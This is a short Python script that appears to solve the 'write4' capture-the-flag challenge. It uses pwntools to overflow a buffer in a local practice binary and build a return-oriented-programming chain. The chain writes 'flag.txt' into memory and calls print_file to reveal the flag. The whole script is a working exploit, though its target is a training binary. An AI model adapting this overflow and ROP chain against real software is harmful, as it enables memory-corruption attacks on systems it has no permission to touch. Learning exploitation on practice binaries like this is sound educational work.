#!/bin/python3

from pwn import *

context.clear(arch='amd64')
filename = './write4'

elf = ELF(filename)
io = process(filename)

# gadgets
r = ROP(elf)

pop = p64(r.r14.address)    # pop r14; pop r15; ret;
mov = p64(0x400628)         # mov qword [r14], r15
bss = elf.bss()

# main
r.raw(cyclic(40))

# write
r.raw(pop)
r.raw(p64(bss))
r.raw(b'flag.txt')
r.raw(mov)

# call print_file
r.call('print_file', [bss])

payload = r.chain()

io.recvuntil('>')
io.sendline(payload)
io.recvuntil('!\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))